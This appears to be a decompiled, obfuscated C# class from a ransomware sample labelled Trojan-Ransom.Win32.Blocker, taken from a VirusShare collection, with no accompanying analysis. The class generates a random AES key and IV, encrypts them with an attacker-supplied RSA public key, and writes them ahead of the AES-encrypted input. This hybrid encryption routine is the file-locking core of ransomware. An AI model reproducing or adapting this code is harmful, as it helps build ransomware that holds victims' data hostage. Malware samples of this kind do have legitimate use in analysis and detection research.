// Decompiled with JetBrains decompiler
// Type: ?26?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 89823795-D5B3-4CC9-949D-6649607AF138
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00080-msil\Trojan-Ransom.Win32.Blocker.bndr-d893b556a8d0493f8839c80049bd91fd0bdbcb93646edcc7b2f28d89325ced11.exe

using System;
using System.IO;
using System.Security.Cryptography;

internal class \u003F26\u003F
{
  public static string \u003F0\u003F;

  public static byte[] \u003F0\u003F(byte[] _param0, string _param1)
  {
    int num1;
    if (_param1.StartsWith(\u003F20\u003F.\u003F53\u003F(264)))
    {
      \u003F26\u003F.\u003F0\u003F = \u003F20\u003F.\u003F53\u003F(269);
      num1 = 0;
    }
    else
      goto label_4;
label_2:
    RSACryptoServiceProvider cryptoServiceProvider;
    MemoryStream memoryStream;
    while (true)
    {
      switch (num1)
      {
        case 0:
          goto label_3;
        case 1:
          cryptoServiceProvider = (RSACryptoServiceProvider) null;
          num1 = 2;
          continue;
        case 2:
          memoryStream = (MemoryStream) null;
          num1 = 3;
          continue;
        default:
          goto label_7;
      }
    }
label_3:
    return (byte[]) null;
label_7:
    CryptoStream cryptoStream = (CryptoStream) null;
    RijndaelManaged rijndaelManaged;
    byte[] numArray1;
    try
    {
      rijndaelManaged = new RijndaelManaged();
      int num2 = 0;
      byte[] numArray2;
      while (true)
      {
        switch (num2)
        {
          case 0:
            cryptoServiceProvider = new RSACryptoServiceProvider();
            num2 = 1;
            continue;
          case 1:
            cryptoServiceProvider.FromXmlString(_param1);
            num2 = 2;
            continue;
          case 2:
            rijndaelManaged.GenerateKey();
            num2 = 3;
            continue;
          case 3:
            rijndaelManaged.GenerateIV();
            num2 = 4;
            continue;
          case 4:
            numArray2 = new byte[48];
            num2 = 5;
            continue;
          case 5:
            Buffer.BlockCopy((Array) rijndaelManaged.Key, 0, (Array) numArray2, 0, 32);
            num2 = 6;
            continue;
          case 6:
            Buffer.BlockCopy((Array) rijndaelManaged.IV, 0, (Array) numArray2, 32, 16);
            num2 = 7;
            continue;
          case 7:
            memoryStream = new MemoryStream();
            try
            {
              byte[] buffer = cryptoServiceProvider.Encrypt(numArray2, false);
              int num3 = 0;
              while (true)
              {
                switch (num3)
                {
                  case 0:
                    memoryStream.WriteByte((byte) 1);
                    num3 = 1;
                    continue;
                  case 1:
                    memoryStream.WriteByte(Convert.ToByte(buffer.Length / 8));
                    num3 = 2;
                    continue;
                  case 2:
                    memoryStream.Write(buffer, 0, buffer.Length);
                    num3 = 3;
                    continue;
                  default:
                    goto label_41;
                }
              }
            }
            catch (CryptographicException ex1)
            {
              try
              {
                byte[] numArray3 = new byte[16];
                int num4 = 0;
                byte[] numArray4;
                byte[] buffer1;
                byte[] buffer2;
                byte[] buffer3;
                while (true)
                {
                  switch (num4)
                  {
                    case 0:
                      numArray4 = new byte[16];
                      num4 = 1;
                      continue;
                    case 1:
                      Buffer.BlockCopy((Array) rijndaelManaged.Key, 0, (Array) numArray3, 0, 16);
                      num4 = 2;
                      continue;
                    case 2:
                      Buffer.BlockCopy((Array) rijndaelManaged.Key, 16, (Array) numArray4, 0, 16);
                      num4 = 3;
                      continue;
                    case 3:
                      buffer1 = cryptoServiceProvider.Encrypt(numArray3, false);
                      num4 = 4;
                      continue;
                    case 4:
                      buffer2 = cryptoServiceProvider.Encrypt(numArray4, false);
                      num4 = 5;
                      continue;
                    case 5:
                      buffer3 = cryptoServiceProvider.Encrypt(rijndaelManaged.IV, false);
                      num4 = 6;
                      continue;
                    case 6:
                      memoryStream.WriteByte((byte) 2);
                      num4 = 7;
                      continue;
                    case 7:
                      memoryStream.WriteByte(Convert.ToByte(buffer1.Length / 8));
                      num4 = 8;
                      continue;
                    case 8:
                      memoryStream.Write(buffer1, 0, buffer1.Length);
                      num4 = 9;
                      continue;
                    case 9:
                      memoryStream.Write(buffer2, 0, buffer2.Length);
                      num4 = 10;
                      continue;
                    case 10:
                      memoryStream.Write(buffer3, 0, buffer3.Length);
                      num4 = 11;
                      continue;
                    default:
                      goto label_41;
                  }
                }
              }
              catch (CryptographicException ex2)
              {
                int num5 = 0;
                while (true)
                {
                  switch (num5)
                  {
                    case 0:
                      \u003F26\u003F.\u003F0\u003F = \u003F20\u003F.\u003F53\u003F(362);
                      num5 = 1;
                      continue;
                    case 1:
                      numArray1 = (byte[]) null;
                      num5 = 2;
                      continue;
                    default:
                      goto label_58;
                  }
                }
              }
            }
label_41:
            cryptoStream = new CryptoStream((Stream) memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
            num2 = 8;
            continue;
          case 8:
            cryptoStream.Write(_param0, 0, _param0.Length);
            num2 = 9;
            continue;
          case 9:
            cryptoStream.FlushFinalBlock();
            num2 = 10;
            continue;
          case 10:
            numArray1 = memoryStream.ToArray();
            num2 = 11;
            continue;
          default:
            goto label_58;
        }
      }
    }
    catch (Exception ex)
    {
      int num6 = 0;
      while (true)
      {
        switch (num6)
        {
          case 0:
            \u003F26\u003F.\u003F0\u003F = \u003F20\u003F.\u003F53\u003F(568) + ex.Message;
            num6 = 1;
            continue;
          case 1:
            numArray1 = (byte[]) null;
            num6 = 2;
            continue;
          default:
            goto label_58;
        }
      }
    }
    finally
    {
      rijndaelManaged?.Clear();
      cryptoServiceProvider?.Clear();
      memoryStream?.Close();
      cryptoStream?.Close();
    }
label_58:
    return numArray1;
label_4:
    rijndaelManaged = (RijndaelManaged) null;
    num1 = 1;
    goto label_2;
  }
}
